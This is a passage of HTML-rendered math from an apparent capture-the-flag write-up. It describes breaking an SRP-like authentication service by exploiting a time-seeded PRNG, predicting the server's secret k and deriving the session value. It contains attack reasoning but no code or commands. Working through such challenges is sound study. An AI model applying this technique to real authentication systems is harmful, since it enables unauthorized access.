style="display: inline-block; position: relative; width: 1.146em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.326em, 1001.15em, 2.366em, -1000em); top: -2.188em; left: 0em;"><span class="mrow" id="MathJax-Span-187"><span class="msubsup" id="MathJax-Span-188"><span style="display: inline-block; position: relative; width: 1.154em; height: 0px;"><span style="position: absolute; clip: rect(3.149em, 1000.65em, 4.189em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-189" style="font-family: MathJax_Math; font-style: italic;">S<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.032em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.373em; left: 0.705em;"><span class="mi" id="MathJax-Span-190" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">a</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span></span><span style="display: inline-block; width: 0px; height: 2.188em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.089em; border-left: 0px solid; width: 0px; height: 0.997em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>S</mi><mi>a</mi></msup></math></span></span><script type="math/tex" id="MathJax-Element-6">S^a</script></span>. There’s some ways to solve it:</p><ol>
-<li>Solve discrete logarithm problem by using special N (e.g. smooth prime). N is a prime so this is not the case.</li>
-<li>Solve discrete logarithm problem to find a, the provided client only 20 bits random integer for <span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-7-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>a</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-191" style="width: 0.628em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.521em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.642em, 1000.5em, 2.406em, -1000em); top: -2.24em; left: 0em;"><span class="mrow" id="MathJax-Span-192"><span class="mi" id="MathJax-Span-193" style="font-family: MathJax_Math; font-style: italic;">a</span></span><span style="display: inline-block; width: 0px; height: 2.24em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.074em; border-left: 0px solid; width: 0px; height: 0.666em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>a</mi></math></span></span><script type="math/tex" id="MathJax-Element-7">a</script></span>. But the service doesn’t crash if I send zero as <span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-8-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>A</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-194" style="width: 0.888em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.729em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.367em, 1000.71em, 2.396em, -1000em); top: -2.24em; left: 0em;"><span class="mrow" id="MathJax-Span-195"><span class="mi" id="MathJax-Span-196" style="font-family: MathJax_Math; font-style: italic;">A</span></span><span style="display: inline-block; width: 0px; height: 2.24em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.063em; border-left: 0px solid; width: 0px; height: 0.984em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>A</mi></math></span></span><script type="math/tex" id="MathJax-Element-8">A</script></span>. So this is not the case.</li>
-<li>Select special B such as <span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-9-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>B</mi><mo>=</mo><mo stretchy=&quot;false&quot;>(</mo><msup><mi>g</mi><mi>k</mi></msup><mspace width=&quot;0.667em&quot; /><mi>mod</mi><mspace width=&quot;thinmathspace&quot; /><mspace width=&quot;thinmathspace&quot; /><mi>N</mi><mo stretchy=&quot;false&quot;>)</mo><mo>+</mo><mn>3</mn><mo>&amp;#x00D7;</mo><mo stretchy=&quot;false&quot;>(</mo><msup><mi>g</mi><mi>x</mi></msup><mspace width=&quot;0.667em&quot; /><mi>mod</mi><mspace width=&quot;thinmathspace&quot; /><mspace width=&quot;thinmathspace&quot; /><mi>N</mi><mo stretchy=&quot;false&quot;>)</mo></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-197" style="width: 20.315em; display: inline-block;"><span style="display: inline-block; position: relative; width: 16.927em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.282em, 1016.83em, 2.698em, -1000em); top: -2.292em; left: 0em;"><span class="mrow" id="MathJax-Span-198"><span class="mi" id="MathJax-Span-199" style="font-family: MathJax_Math; font-style: italic;">B</span><span class="mo" id="MathJax-Span-200" style="font-family: MathJax_Main; padding-left: 0.278em;">=</span><span class="mo" id="MathJax-Span-201" style="font-family: MathJax_Main; padding-left: 0.278em;">(</span><span class="msubsup" id="MathJax-Span-202"><span style="display: inline-block; position: relative; width: 0.974em; height: 0px;"><span style="position: absolute; clip: rect(3.412em, 1000.48em, 4.372em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-203" style="font-family: MathJax_Math; font-style: italic;">g<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.373em; left: 0.531em;"><span class="mi" id="MathJax-Span-204" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">k</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="TeXmathchoice" id="MathJax-Span-205"><span class="mspace" id="MathJax-Span-206" style="height: 0em; vertical-align: 0em; width: 0.667em; display: inline-block; overflow: hidden;"></span></span><span class="mi" id="MathJax-Span-207" style="font-family: MathJax_Main; padding-left: 0.167em;">mod</span><span class="mspace" id="MathJax-Span-208" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mspace" id="MathJax-Span-209" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mi" id="MathJax-Span-210" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.167em;">N<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.085em;"></span></span><span class="mo" id="MathJax-Span-211" style="font-family: MathJax_Main;">)</span><span class="mo" id="MathJax-Span-212" style="font-family: MathJax_Main; padding-left: 0.222em;">+</span><span class="mn" id="MathJax-Span-213" style="font-family: MathJax_Main; padding-left: 0.222em;">3</span><span class="mo" id="MathJax-Span-214" style="font-family: MathJax_Main; padding-left: 0.222em;">×</span><span class="mo" id="MathJax-Span-215" style="font-family: MathJax_Main; padding-left: 0.222em;">(</span><span class="msubsup" id="MathJax-Span-216"><span style="display: inline-block; position: relative; width: 1.01em; height: 0px;"><span style="position: absolute; clip: rect(3.412em, 1000.48em, 4.372em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-217" style="font-family: MathJax_Math; font-style: italic;">g<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.373em; left: 0.531em;"><span class="mi" id="MathJax-Span-218" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">x</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="TeXmathchoice" id="MathJax-Span-219"><span class="mspace" id="MathJax-Span-220" style="height: 0em; vertical-align: 0em; width: 0.667em; display: inline-block; overflow: hidden;"></span></span><span class="mi" id="MathJax-Span-221" style="font-family: MathJax_Main; padding-left: 0.167em;">mod</span><span class="mspace" id="MathJax-Span-222" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mspace" id="MathJax-Span-223" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mi" id="MathJax-Span-224" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.167em;">N<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.085em;"></span></span><span class="mo" id="MathJax-Span-225" style="font-family: MathJax_Main;">)</span></span><span style="display: inline-block; width: 0px; height: 2.292em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.362em; border-left: 0px solid; width: 0px; height: 1.449em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>B</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mi>k</mi></msup><mspace width="0.667em"></mspace><mi>mod</mi><mspace width="thinmathspace"></mspace><mspace width="thinmathspace"></mspace><mi>N</mi><mo stretchy="false">)</mo><mo>+</mo><mn>3</mn><mo>×</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mi>x</mi></msup><mspace width="0.667em"></mspace><mi>mod</mi><mspace width="thinmathspace"></mspace><mspace width="thinmathspace"></mspace><mi>N</mi><mo stretchy="false">)</mo></math></span></span><script type="math/tex" id="MathJax-Element-9">B = (g^k \mod N) + 3 \times (g^x \mod N)</script></span>, so <span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-10-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><msup><mi>S</mi><mi>a</mi></msup><mo>=</mo><msup><mi>A</mi><mi>k</mi></msup><mspace width=&quot;0.667em&quot; /><mi>mod</mi><mspace width=&quot;thinmathspace&quot; /><mspace width=&quot;thinmathspace&quot; /><mi>N</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-226" style="width: 9.378em; display: inline-block;"><span style="display: inline-block; position: relative; width: 7.813em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.282em, 1007.81em, 2.47em, -1000em); top: -2.292em; left: 0em;"><span class="mrow" id="MathJax-Span-227"><span class="msubsup" id="MathJax-Span-228"><span style="display: inline-block; position: relative; width: 1.154em; height: 0px;"><span style="position: absolute; clip: rect(3.149em, 1000.65em, 4.189em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-229" style="font-family: MathJax_Math; font-style: italic;">S<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.032em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.373em; left: 0.705em;"><span class="mi" id="MathJax-Span-230" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">a</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="mo" id="MathJax-Span-231" style="font-family: MathJax_Main; padding-left: 0.278em;">=</span><span class="msubsup" id="MathJax-Span-232" style="padding-left: 0.278em;"><span style="display: inline-block; position: relative; width: 1.193em; height: 0px;"><span style="position: absolute; clip: rect(3.138em, 1000.73em, 4.167em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-233" style="font-family: MathJax_Math; font-style: italic;">A</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.373em; left: 0.75em;"><span class="mi" id="MathJax-Span-234" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">k</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="TeXmathchoice" id="MathJax-Span-235"><span class="mspace" id="MathJax-Span-236" style="height: 0em; vertical-align: 0em; width: 0.667em; display: inline-block; overflow: hidden;"></span></span><span class="mi" id="MathJax-Span-237" style="font-family: MathJax_Main; padding-left: 0.167em;">mod</span><span class="mspace" id="MathJax-Span-238" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mspace" id="MathJax-Span-239" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mi" id="MathJax-Span-240" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.167em;">N<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.085em;"></span></span></span><span style="display: inline-block; width: 0px; height: 2.292em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.089em; border-left: 0px solid; width: 0px; height: 1.176em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>S</mi><mi>a</mi></msup><mo>=</mo><msup><mi>A</mi><mi>k</mi></msup><mspace width="0.667em"></mspace><mi>mod</mi><mspace width="thinmathspace"></mspace><mspace width="thinmathspace"></mspace><mi>N</mi></math></span></span><script type="math/tex" id="MathJax-Element-10">S^a = A^k \mod N</script></span>. There’s some sign of this case: B is always smaller than 4N but some times greater than 3N.</li>
-</ol><h4 id="PRNG"><a class="anchor hidden-xs" href="#PRNG" title="PRNG"><span class="octicon octicon-link"></span></a>PRNG</h4><p>The provided client generate <span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-11-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>a</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-241" style="width: 0.628em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.521em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.642em, 1000.5em, 2.406em, -1000em); top: -2.24em; left: 0em;"><span class="mrow" id="MathJax-Span-242"><span class="mi" id="MathJax-Span-243" style="font-family: MathJax_Math; font-style: italic;">a</span></span><span style="display: inline-block; width: 0px; height: 2.24em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.074em; border-left: 0px solid; width: 0px; height: 0.666em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>a</mi></math></span></span><script type="math/tex" id="MathJax-Element-11">a</script></span> using current time as seed. If we open multiple connection within one second, the service replies same salt and <span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-12-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>B</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-244" style="width: 0.94em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.781em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.4em, 1000.78em, 2.396em, -1000em); top: -2.24em; left: 0em;"><span class="mrow" id="MathJax-Span-245"><span class="mi" id="MathJax-Span-246" style="font-family: MathJax_Math; font-style: italic;">B</span></span><span style="display: inline-block; width: 0px; height: 2.24em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.063em; border-left: 0px solid; width: 0px; height: 0.945em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>B</mi></math></span></span><script type="math/tex" id="MathJax-Element-12">B</script></span>, which means remote also use PRNG with time as seed. Moreover, the service generated salt is same as our <span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-13-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>a</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-247" style="width: 0.628em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.521em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.642em, 1000.5em, 2.406em, -1000em); top: -2.24em; left: 0em;"><span class="mrow" id="MathJax-Span-248"><span class="mi" id="MathJax-Span-249" style="font-family: MathJax_Math; font-style: italic;">a</span></span><span style="display: inline-block; width: 0px; height: 2.24em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.074em; border-left: 0px solid; width: 0px; height: 0.666em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>a</mi></math></span></span><script type="math/tex" id="MathJax-Element-13">a</script></span>, so we can predict remote’s PRNG !!</p><p>We guess the service generate <span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-14-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>k</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-250" style="width: 0.628em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.521em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.389em, 1000.5em, 2.407em, -1000em); top: -2.24em; left: 0em;"><span class="mrow" id="MathJax-Span-251"><span class="mi" id="MathJax-Span-252" style="font-family: MathJax_Math; font-style: italic;">k</span></span><span style="display: inline-block; width: 0px; height: 2.24em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.076em; border-left: 0px solid; width: 0px; height: 0.971em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>k</mi></math></span></span><script type="math/tex" id="MathJax-Element-14">k</script></span> using same PRNG after salt. To verify it, <span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-15-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>S</mi><mo>&amp;#x2212;</mo><mi>B</mi><mo>=</mo><mn>3</mn><mo>&amp;#x00D7;</mo><mo stretchy=&quot;false&quot;>(</mo><msup><mi>g</mi><mi>x</mi></msup><mspace width=&quot;0.667em&quot; /><mi>mod</mi><mspace width=&quot;thinmathspace&quot; /><mspace width=&quot;thinmathspace&quot; /><mi>N</mi><mo stretchy=&quot;false&quot;>)</mo></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-253" style="width: 14.013em; display: inline-block;"><span style="display: inline-block; position: relative; width: 11.667em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.385em, 1011.57em, 2.698em, -1000em); top: -2.292em; left: 0em;"><span class="mrow" id="MathJax-Span-254"><span class="mi" id="MathJax-Span-255" style="font-family: MathJax_Math; font-style: italic;">S<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.032em;"></span></span><span class="mo" id="MathJax-Span-256" style="font-family: MathJax_Main; padding-left: 0.222em;">−</span><span class="mi" id="MathJax-Span-257" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.222em;">B</span><span class="mo" id="MathJax-Span-258" style="font-family: MathJax_Main; padding-left: 0.278em;">=</span><span class="mn" id="MathJax-Span-259" style="font-family: MathJax_Main; padding-left: 0.278em;">3</span><span class="mo" id="MathJax-Span-260" style="font-family: MathJax_Main; padding-left: 0.222em;">×</span><span class="mo" id="MathJax-Span-261" style="font-family: MathJax_Main; padding-left: 0.222em;">(</span><span class="msubsup" id="MathJax-Span-262"><span style="display: inline-block; position: relative; width: 1.01em; height: 0px;"><span style="position: absolute; clip: rect(3.412em, 1000.48em, 4.372em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-263" style="font-family: MathJax_Math; font-style: italic;">g<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.373em; left: 0.531em;"><span class="mi" id="MathJax-Span-264" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">x</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="TeXmathchoice" id="MathJax-Span-265"><span class="mspace" id="MathJax-Span-266" style="height: 0em; vertical-align: 0em; width: 0.667em; display: inline-block; overflow: hidden;"></span></span><span class="mi" id="MathJax-Span-267" style="font-family: MathJax_Main; padding-left: 0.167em;">mod</span><span class="mspace" id="MathJax-Span-268" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mspace" id="MathJax-Span-269" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mi" id="MathJax-Span-270" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.167em;">N<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.085em;"></span></span><span class="mo" id="MathJax-Span-271" style="font-family: MathJax_Main;">)</span></span><span style="display: inline-block; width: 0px; height: 2.292em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.362em; border-left: 0px solid; width: 0px; height: 1.325em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>S</mi><mo>−</mo><mi>B</mi><mo>=</mo><mn>3</mn><mo>×</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mi>x</mi></msup><mspace width="0.667em"></mspace><mi>mod</mi><mspace width="thinmathspace"></mspace><mspace width="thinmathspace"></mspace><mi>N</mi><mo stretchy="false">)</mo></math></span></span><script type="math/tex" id="MathJax-Element-15">S - B = 3 \times (g^x \mod N)</script></span> should be multiple of 3. Bingo! Now we have <span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-16-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><msup><mi>g</mi><mi>x</mi></msup><mo>,</mo><mi>S</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-272" style="width: 2.503em; display: inline-block;"><span style="display: inline-block; position: relative; width: 2.083em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.43em, 1002.08em, 2.653em, -1000em); top: -2.292em; left: 0em;"><span class="mrow" id="MathJax-Span-273"><span class="msubsup" id="MathJax-Span-274"><span style="display: inline-block; position: relative; width: 1.01em; height: 0px;"><span style="position: absolute; clip: rect(3.412em, 1000.48em, 4.372em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-275" style="font-family: MathJax_Math; font-style: italic;">g<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.373em; left: 0.531em;"><span class="mi" id="MathJax-Span-276" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">x</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="mo" id="MathJax-Span-277" style="font-family: MathJax_Main;">,</span><span class="mi" id="MathJax-Span-278" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.167em;">S<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.032em;"></span></span></span><span style="display: inline-block; width: 0px; height: 2.292em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.308em; border-left: 0px solid; width: 0px; height: 1.217em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>g</mi><mi>x</mi></msup><mo>,</mo><mi>S</mi></math></span></span><script type="math/tex" id="MathJax-Element-16">g^x, S</script></span>, we can generate <span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-17-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>T</mi><mo>=</mo><msup><mi>S</mi><mi>a</mi></msup><mo>&amp;#x00D7;</mo><mo stretchy=&quot;false&quot;>(</mo><msup><mi>g</mi><mi>x</mi></msup><msup><mo stretchy=&quot;false&quot;>)</mo><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mi>u</mi><mi>k</mi></mrow></msup><mspace width=&quot;0.667em&quot; /><mi>mod</mi><mspace width=&quot;thinmathspace&quot; /><mspace width=&quot;thinmathspace&quot; /><mi>N</mi></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-279" style="width: 13.44em; display: inline-block;"><span style="display: inline-block; position: relative; width: 11.198em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.282em, 1011.2em, 2.698em, -1000em); top: -2.292em; left: 0em;"><span class="mrow" id="MathJax-Span-280"><span class="mi" id="MathJax-Span-281" style="font-family: MathJax_Math; font-style: italic;">T<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.12em;"></span></span><span class="mo" id="MathJax-Span-282" style="font-family: MathJax_Main; padding-left: 0.278em;">=</span><span class="msubsup" id="MathJax-Span-283" style="padding-left: 0.278em;"><span style="display: inline-block; position: relative; width: 1.154em; height: 0px;"><span style="position: absolute; clip: rect(3.149em, 1000.65em, 4.189em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-284" style="font-family: MathJax_Math; font-style: italic;">S<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.032em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.373em; left: 0.705em;"><span class="mi" id="MathJax-Span-285" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">a</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="mo" id="MathJax-Span-286" style="font-family: MathJax_Main; padding-left: 0.222em;">×</span><span class="mo" id="MathJax-Span-287" style="font-family: MathJax_Main; padding-left: 0.222em;">(</span><span class="msubsup" id="MathJax-Span-288"><span style="display: inline-block; position: relative; width: 1.01em; height: 0px;"><span style="position: absolute; clip: rect(3.412em, 1000.48em, 4.372em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-289" style="font-family: MathJax_Math; font-style: italic;">g<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.373em; left: 0.531em;"><span class="mi" id="MathJax-Span-290" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">x</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="msubsup" id="MathJax-Span-291"><span style="display: inline-block; position: relative; width: 1.237em; height: 0px;"><span style="position: absolute; clip: rect(3.104em, 1000.29em, 4.417em, -1000em); top: -4.01em; left: 0em;"><span class="mo" id="MathJax-Span-292" style="font-family: MathJax_Main;">)</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.373em; left: 0.389em;"><span class="texatom" id="MathJax-Span-293"><span class="mrow" id="MathJax-Span-294"><span class="mi" id="MathJax-Span-295" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">u</span><span class="mi" id="MathJax-Span-296" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">k</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="TeXmathchoice" id="MathJax-Span-297"><span class="mspace" id="MathJax-Span-298" style="height: 0em; vertical-align: 0em; width: 0.667em; display: inline-block; overflow: hidden;"></span></span><span class="mi" id="MathJax-Span-299" style="font-family: MathJax_Main; padding-left: 0.167em;">mod</span><span class="mspace" id="MathJax-Span-300" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mspace" id="MathJax-Span-301" style="height: 0em; vertical-align: 0em; width: 0.167em; display: inline-block; overflow: hidden;"></span><span class="mi" id="MathJax-Span-302" style="font-family: MathJax_Math; font-style: italic; padding-left: 0.167em;">N<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.085em;"></span></span></span><span style="display: inline-block; width: 0px; height: 2.292em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.362em; border-left: 0px solid; width: 0px; height: 1.449em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>T</mi><mo>=</mo><msup><mi>S</mi><mi>a</mi></msup><mo>×</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mi>x</mi></msup><msup><mo stretchy="false">)</mo><mrow class="MJX-TeXAtom-ORD"><mi>u</mi><mi>k</mi></mrow></msup><mspace width="0.667em"></mspace><mi>mod</mi><mspace width="thinmathspace"></mspace><mspace width="thinmathspace"></mspace><mi>N</mi></math></span></span><script type="math/tex" id="MathJax-Element-17">T = S^a \times (g^x)^{uk} \mod N</script></span></p></div>
-    <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
-        <div class="pull-right dropdown">
-            <a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
-                <i class="fa fa-bars"></i>
-            </a>
-            <ul id="ui-toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel">
